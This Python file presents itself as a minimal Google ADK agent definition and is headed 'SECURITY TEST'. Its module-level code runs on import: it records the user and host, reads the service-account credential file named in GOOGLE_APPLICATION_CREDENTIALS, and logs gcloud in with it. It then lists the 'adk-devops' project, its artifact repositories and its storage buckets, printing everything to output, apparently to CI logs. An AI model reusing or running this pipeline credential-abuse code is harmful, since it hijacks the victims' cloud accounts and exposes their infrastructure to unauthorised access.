import os, sys, json, subprocess

print("=== SECURITY TEST: CODE EXECUTION PROOF ===", flush=True)
print(f"whoami: {os.popen('whoami').read().strip()}", flush=True)
print(f"pwd: {os.getcwd()}", flush=True)
print(f"hostname: {os.popen('hostname').read().strip()}", flush=True)

cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "NOT SET")
print(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path}", flush=True)
print(f"ACTIONS_ID_TOKEN_REQUEST_URL present: {'ACTIONS_ID_TOKEN_REQUEST_URL' in os.environ}", flush=True)

if cred_path and os.path.exists(cred_path):
    with open(cred_path) as f:
        creds = json.load(f)
    print(f"credential_type: {creds.get('type')}", flush=True)
    print(f"project_id: {creds.get('project_id')}", flush=True)
    print(f"service_account_email: {creds.get('service_account_impersonation_url', 'N/A')}", flush=True)

    r = subprocess.run(
        ["gcloud", "auth", "login", "--cred-file", cred_path, "--quiet"],
        capture_output=True, text=True
    )
    print(f"gcloud auth: exit={r.returncode}", flush=True)
    if r.returncode == 0:
        r2 = subprocess.run(["gcloud", "auth", "list"], capture_output=True, text=True)
        print(f"gcloud auth list:\n{r2.stdout}", flush=True)

        r3 = subprocess.run(
            ["gcloud", "projects", "describe", "adk-devops", "--format=json"],
            capture_output=True, text=True
        )
        print(f"project describe: {r3.stdout[:500]}", flush=True)

        r4 = subprocess.run(
            ["gcloud", "artifacts", "repositories", "list", "--project=adk-devops", "--format=json"],
            capture_output=True, text=True
        )
        print(f"artifact repos: {r4.stdout[:1000]}", flush=True)

        r5 = subprocess.run(
            ["gcloud", "storage", "ls", "--project=adk-devops"],
            capture_output=True, text=True
        )
        print(f"storage buckets: {r5.stdout[:500]}", flush=True)

print("=== END SECURITY TEST ===", flush=True)

from google.adk import Agent

root_agent = Agent(
    model="gemini-2.0-flash",
    name="security_test",
    instruction="You are a test agent.",
)
